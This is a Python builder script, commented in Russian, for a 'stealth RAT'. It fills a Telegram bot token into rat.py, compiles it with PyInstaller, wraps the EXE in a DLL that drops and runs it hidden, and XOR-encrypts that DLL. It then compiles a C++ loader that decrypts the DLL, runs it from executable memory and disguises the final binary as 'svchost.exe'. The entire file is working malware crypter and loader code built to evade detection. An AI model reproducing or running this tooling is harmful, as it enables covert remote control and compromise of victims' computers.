# build.py - БИНАРНОЕ встраивание (без 80 MB текста!)
import os
import sys
import subprocess
import random
import zlib
import shutil

class StealthBuilder:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        self.xor_key = bytes([random.randint(1, 255) for _ in range(16)])
        
    def build_exe_with_pyinstaller(self):
        print("[+] Building EXE with PyInstaller...")
        
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name", "payload",
            "--target-arch", "x86",
            "--upx-dir", "C:\\ProgramData\\chocolatey\\lib\\upx\\tools",
            "--hidden-import", "telegram",
            "--hidden-import", "telegram.ext",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.ImageGrab",
            "--hidden-import", "psutil",
            "--hidden-import", "requests",
            "--hidden-import", "sounddevice",
            "--hidden-import", "soundfile",
            "--hidden-import", "cryptography",
            "--hidden-import", "cryptography.fernet",
            "--hidden-import", "tkinter",
            "--hidden-import", "pycaw",
            "--hidden-import", "comtypes",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "GPUtil",
            "--hidden-import", "win10toast",
            "--collect-all", "telegram",
            "rat.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] PyInstaller error: {result.stderr.decode()}")
            return None
            
        exe_path = "dist/payload.exe"
        if not os.path.exists(exe_path):
            for f in os.listdir("dist"):
                if f.endswith(".exe"):
                    exe_path = os.path.join("dist", f)
                    break
        
        if not os.path.exists(exe_path):
            print("[-] EXE not found!")
            return None
            
        shutil.copy(exe_path, "payload.exe")
        size_mb = os.path.getsize('payload.exe') / (1024*1024)
        print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
        return "payload.exe"
    
    def convert_exe_to_dll(self, exe_path):
        print("[+] Converting EXE to DLL...")
        
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        
        dll_template = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Данные встраиваются через objcopy (бинарно!)
extern unsigned char _binary_payload_bin_start[];
extern unsigned char _binary_payload_bin_end[];

static void RunEXE() {
    char temp_path[MAX_PATH];
    char exe_path[MAX_PATH];
    DWORD written;
    HANDLE hFile;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    // Размер данных
    size_t exe_size = _binary_payload_bin_end - _binary_payload_bin_start;
    
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
    
    hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    WriteFile(hFile, _binary_payload_bin_start, exe_size, &written, NULL);
    CloseHandle(hFile);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    Sleep(5000);
    DeleteFileA(exe_path);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunEXE, NULL, 0, NULL);
    }
    return TRUE;
}
'''
        # Сохраняем бинарные данные
        with open('payload.bin', 'wb') as f:
            f.write(exe_data)
        
        # Сохраняем DLL код
        with open('payload_dll.c', 'w') as f:
            f.write(dll_template)
        
        # Компилируем DLL с БИНАРНЫМ встраиванием через objcopy
        cmd = [
            'gcc', '-shared', '-o', 'payload.dll',
            'payload_dll.c',
            'payload.bin',  # ← БИНАРНЫЕ данные!
            '-static', '-s', '-O2',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] DLL compilation error: {result.stderr.decode()}")
            return None
            
        size_mb = os.path.getsize('payload.dll') / (1024*1024)
        print(f"[+] DLL ready! Size: {size_mb:.1f} MB")
        return "payload.dll"
    
    def encrypt_dll(self, dll_path):
        print("[+] Encrypting DLL...")
        
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        
        compressed = zlib.compress(dll_data, level=9)
        
        encrypted = bytearray(compressed)
        for i in range(len(encrypted)):
            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
        
        # Сохраняем зашифрованные данные
        with open('encrypted.bin', 'wb') as f:
            f.write(encrypted)
        
        size_mb = len(encrypted) / (1024*1024)
        print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
        return encrypted
    
    def build_loader(self):
        """Собирает загрузчик с БИНАРНЫМ встраиванием"""
        print("[+] Building loader with binary embedding...")
        
        loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Бинарные данные встраиваются через objcopy
extern unsigned char _binary_encrypted_bin_start[];
extern unsigned char _binary_encrypted_bin_end[];
extern unsigned char _binary_key_bin_start[];
extern unsigned char _binary_key_bin_end[];

static void xor_decrypt(unsigned char* data, size_t len, 
                        unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

static bool LoadDLLFromMemory(unsigned char* dll_data, size_t dll_size) {
    if (dll_data[0] != 'M' || dll_data[1] != 'Z') return false;
    
    void* dll_memory = VirtualAlloc(NULL, dll_size, 
                                    MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_EXECUTE_READWRITE);
    if (!dll_memory) return false;
    
    memcpy(dll_memory, dll_data, dll_size);
    
    unsigned char* bytes = (unsigned char*)dll_memory;
    unsigned int e_lfanew = *(unsigned int*)&bytes[0x3C];
    unsigned int entry_point_rva = *(unsigned int*)&bytes[e_lfanew + 0x28];
    
    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t dll_main = (DllMain_t)((unsigned char*)dll_memory + entry_point_rva);
    
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dll_main, 
                                  dll_memory, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        return true;
    }
    
    return dll_main((HINSTANCE)dll_memory, DLL_PROCESS_ATTACH, NULL) == TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    size_t dll_len = _binary_encrypted_bin_end - _binary_encrypted_bin_start;
    size_t key_len = _binary_key_bin_end - _binary_key_bin_start;
    
    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
    if (!decrypted) return 1;
    
    memcpy(decrypted, _binary_encrypted_bin_start, dll_len);
    
    xor_decrypt(decrypted, dll_len, _binary_key_bin_start, key_len);
    
    bool success = LoadDLLFromMemory(decrypted, dll_len);
    
    if (!success) {
        char temp_path[MAX_PATH];
        char dll_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        sprintf(dll_path, "%s\\\\tmp_%x.dll", temp_path, GetTickCount());
        
        HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, decrypted, dll_len, &written, NULL);
            CloseHandle(hFile);
            
            LoadLibraryA(dll_path);
            Sleep(3000);
            DeleteFileA(dll_path);
            success = true;
        }
    }
    
    free(decrypted);
    
    if (success) {
        while (1) Sleep(10000);
    }
    
    return success ? 0 : 1;
}
'''
        # Сохраняем загрузчик
        with open('loader_final.cpp', 'w') as f:
            f.write(loader_code)
        
        # Сохраняем ключ
        with open('key.bin', 'wb') as f:
            f.write(self.xor_key)
        
        print("[+] Loader ready!")
        return 'loader_final.cpp'
    
    def compile_loader(self, loader_path):
        """Компилирует загрузчик с БИНАРНЫМ встраиванием"""
        print("[+] Compiling final EXE with binary embedding...")
        
        # Используем objcopy для бинарного встраивания
        cmd = [
            'g++',
            '-o', 'svchost.exe',
            loader_path,
            'encrypted.bin',  # ← БИНАРНЫЕ данные!
            'key.bin',        # ← БИНАРНЫЙ ключ!
            '-static',
            '-s',
            '-O2',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] Error: {result.stderr.decode()}")
            return None
        
        size_kb = os.path.getsize('svchost.exe') / 1024
        print(f"[+] FINAL EXE ready! Size: {size_kb:.1f} KB")
        return 'svchost.exe'
    
    def build(self):
        print("[+] STARTING STEALTH RAT BUILD")
        print("=" * 60)
        
        # 1. Обновляем rat.py
        print("[+] Updating rat.py...")
        with open('rat.py', 'r', encoding='utf-8') as f:
            content = f.read()
        content = content.replace('{{TOKEN}}', self.token)
        content = content.replace('{{ADMIN_ID}}', str(self.admin_id))
        with open('rat.py', 'w', encoding='utf-8') as f:
            f.write(content)
        
        # 2. Собираем EXE
        exe = self.build_exe_with_pyinstaller()
        if not exe:
            return False
        
        # 3. Конвертируем в DLL
        dll = self.convert_exe_to_dll(exe)
        if not dll:
            return False
        
        # 4. Шифруем DLL
        encrypted = self.encrypt_dll(dll)
        if not encrypted:
            return False
        
        # 5. Собираем загрузчик
        loader = self.build_loader()
        if not loader:
            return False
        
        # 6. Компилируем финальный EXE (БЫСТРО!)
        final_exe = self.compile_loader(loader)
        
        if final_exe:
            print("=" * 60)
            print("[+] BUILD COMPLETED SUCCESSFULLY!")
            print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
            print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
            print(f"[+] Key: {self.xor_key.hex()}")
            
            with open('key.txt', 'w') as f:
                f.write(self.xor_key.hex())
            
            return True
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python build.py TOKEN ADMIN_ID")
        sys.exit(1)
    
    token = sys.argv[1]
    admin_id = sys.argv[2]
    
    builder = StealthBuilder(token, admin_id)
    builder.build()
